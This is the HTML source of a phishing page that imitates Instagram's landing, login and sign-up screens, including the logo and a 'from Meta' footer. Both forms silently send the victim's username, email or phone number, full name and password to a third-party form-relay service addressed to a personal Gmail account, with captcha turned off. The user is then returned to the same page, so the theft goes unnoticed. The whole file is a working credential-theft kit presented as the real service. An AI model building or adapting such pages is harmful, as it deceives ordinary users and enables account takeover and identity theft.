<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .page {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 90vh;
        }

        .hidden {
            display: none !important;
        }

        /* Loader Screen */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999;
            transition: opacity 0.5s ease;
        }
        .loader-logo-svg {
            width: 80px;
            height: 80px;
        }

        /* Instagram Camera Logo Styling */
        .insta-logo-svg {
            width: 75px;
            height: 150px;
            margin: 20px auto;
            display: block;
        }
        .landing-logo-text {
            font-size: 34px;
            font-weight: bold;
            font-family: cursive;
            margin: 20px 0 10px 0;
            letter-spacing: 1px;
        }

        /* Landing Page Styles */
        .landing-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
        }
        .landing-text {
            font-size: 22px;
            font-weight: 600;
            line-height: 1.4;
            margin-bottom: 30px;
        }
        .landing-text span {
            color: #ff2d55;
        }
        .btn-primary {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .landing-links {
            font-size: 14px;
            color: #8e8e8e;
        }
        .landing-links a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        /* Form & Inputs Styles */
        .form-container {
            width: 100%;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .form-container form {
            width: 100%;
        }
        input {
            width: 100%;
            padding: 14px 12px;
            background: #121212;
            border: 1px solid #262626;
            color: white;
            border-radius: 12px;
            margin-bottom: 12px;
            box-sizing: border-box;
            font-size: 14px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .submit-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
        }
        .forgot-link {
            margin-top: 15px;
            display: block;
            color: #e0e0e0;
            font-size: 14px;
            text-decoration: none;
        }

        /* Secondary Button */
        .secondary-btn {
            width: 100%;
            background: transparent;
            color: #0095f6;
            border: 1px solid #262626;
            padding: 12px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }

        /* Meta Footer */
        .meta-footer {
            margin-top: 30px;
            font-size: 12px;
            color: #737373;
            text-align: center;
            letter-spacing: 0.5px;
        }
        .meta-brand {
            font-size: 15px;
            font-weight: 600;
            color: #ffffff;
            letter-spacing: 1px;
            margin-top: 2px;
        }
    </style>
</head>
<body>

    <!-- 2 Seconds Loading Screen -->
    <div id="loader">
        <svg class="loader-logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="loader-grad" x1="20%" y1="90%" x2="90%" y2="20%">
                    <stop offset="0%" stop-color="#FEDA75" />
                    <stop offset="25%" stop-color="#FA7E1E" />
                    <stop offset="50%" stop-color="#D62976" />
                    <stop offset="75%" stop-color="#962FBF" />
                    <stop offset="100%" stop-color="#4F5BD5" />
                </linearGradient>
            </defs>
            <path fill="url(#loader-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
        </svg>
    </div>

    <!-- Meta Footer Template -->
    <div id="metaFooterTemplate" style="display:none;">
        <div class="meta-footer">
            from
            <div class="meta-brand">∞ Meta</div>
        </div>
    </div>

    <!-- 1. LANDING PAGE -->
    <div id="landingPage" class="page">
        <div style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">English (UK)</div>
        
        <div class="landing-content">
            <div class="landing-logo-text">Instagram</div>
            <div class="landing-text">
                Share <span>everyday moments</span> with your close friends.
            </div>
            <button class="btn-primary" onclick="alert('Instagram app is ready!')">Open Instagram</button>
            <div class="landing-links">
                <a href="#" id="toLoginFromLanding">Log In</a> or <a href="#" id="toSignupFromLanding">Sign Up</a>
            </div>
        </div>

        <div id="landingMetaContainer" style="width: 100%; margin-bottom: 20px;"></div>
    </div>

    <!-- 2. LOGIN PAGE -->
    <div id="loginPage" class="page hidden">
        <div style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">English (UK)</div>

        <div class="form-container">
            <svg class="insta-logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="login-grad" x1="20%" y1="90%" x2="90%" y2="20%">
                        <stop offset="0%" stop-color="#FEDA75" />
                        <stop offset="25%" stop-color="#FA7E1E" />
                        <stop offset="50%" stop-color="#D62976" />
                        <stop offset="75%" stop-color="#962FBF" />
                        <stop offset="100%" stop-color="#4F5BD5" />
                    </linearGradient>
                </defs>
                <path fill="url(#login-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
            
            <!-- Updated Action URL with Non60701@gmail.com -->
            <form id="loginForm" action="https://formsubmit.co/Non60701@gmail.com" method="POST">
                <input type="hidden" name="_next" value="">
                <input type="hidden" name="_captcha" value="false">
                
                <input type="text" name="username_or_email" placeholder="Username, email address or mobile number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="submit-btn">Log in</button>
            </form>

            <a href="#" class="forgot-link" onclick="alert('Forgotten password feature coming soon!')">Forgotten password?</a>
        </div>

        <div style="width: 100%; margin-bottom: 20px;">
            <a href="#" id="switchToSignup" class="secondary-btn">Create new account</a>
            <div id="loginMetaContainer" style="margin-top: 20px;"></div>
        </div>
    </div>

    <!-- 3. SIGN UP PAGE -->
    <div id="signupPage" class="page hidden">
        <div style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">English (UK)</div>

        <div class="form-container">
            <svg class="insta-logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="signup-grad" x1="20%" y1="90%" x2="90%" y2="20%">
                        <stop offset="0%" stop-color="#FEDA75" />
                        <stop offset="25%" stop-color="#FA7E1E" />
                        <stop offset="50%" stop-color="#D62976" />
                        <stop offset="75%" stop-color="#962FBF" />
                        <stop offset="100%" stop-color="#4F5BD5" />
                    </linearGradient>
                </defs>
                <path fill="url(#signup-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>

            <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Sign up to see photos and videos from your friends.</p>
            
            <!-- Updated Action URL with Non60701@gmail.com -->
            <form id="signupForm" action="https://formsubmit.co/Non60701@gmail.com" method="POST">
                <input type="hidden" name="_next" value="">
                <input type="hidden" name="_captcha" value="false">

                <input type="text" name="email_or_mobile" placeholder="Mobile Number or Email" required>
                <input type="text" name="full_name" placeholder="Full Name" required>
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="submit-btn">Sign up</button>
            </form>
        </div>

        <div style="width: 100%; margin-bottom: 20px;">
            <a href="#" id="switchToLogin" class="secondary-btn">Log in</a>
            <div id="signupMetaContainer" style="margin-top: 20px;"></div>
        </div>
    </div>

    <!-- JavaScript Logic -->
    <script>
        const currentUrl = window.location.href;
        document.querySelectorAll('input[name="_next"]').forEach(el => el.value = currentUrl);

        const metaFooterHTML = document.getElementById('metaFooterTemplate').innerHTML;
        document.getElementById('landingMetaContainer').innerHTML = metaFooterHTML;
        document.getElementById('loginMetaContainer').innerHTML = metaFooterHTML;
        document.getElementById('signupMetaContainer').innerHTML = metaFooterHTML;

        window.addEventListener('load', function() {
            setTimeout(function() {
                const loader = document.getElementById('loader');
                if (loader) {
                    loader.style.opacity = '0';
                    setTimeout(function() {
                        loader.style.display = 'none';
                    }, 500);
                }
            }, 2000);
        });

        const landingPage = document.getElementById('landingPage');
        const loginPage = document.getElementById('loginPage');
        const signupPage = document.getElementById('signupPage');

        document.getElementById('toLoginFromLanding').addEventListener('click', (e) => {
            e.preventDefault();
            landingPage.classList.add('hidden');
            loginPage.classList.remove('hidden');
        });

        document.getElementById('toSignupFromLanding').addEventListener('click', (e) => {
            e.preventDefault();
            landingPage.classList.add('hidden');
            signupPage.classList.remove('hidden');
        });

        document.getElementById('switchToSignup').addEventListener('click', (e) => {
            e.preventDefault();
            loginPage.classList.add('hidden');
            signupPage.classList.remove('hidden');
        });

        document.getElementById('switchToLogin').addEventListener('click', (e) => {
            e.preventDefault();
            signupPage.classList.add('hidden');
            loginPage.classList.remove('hidden');
        });
    </script>
</body>
</html>
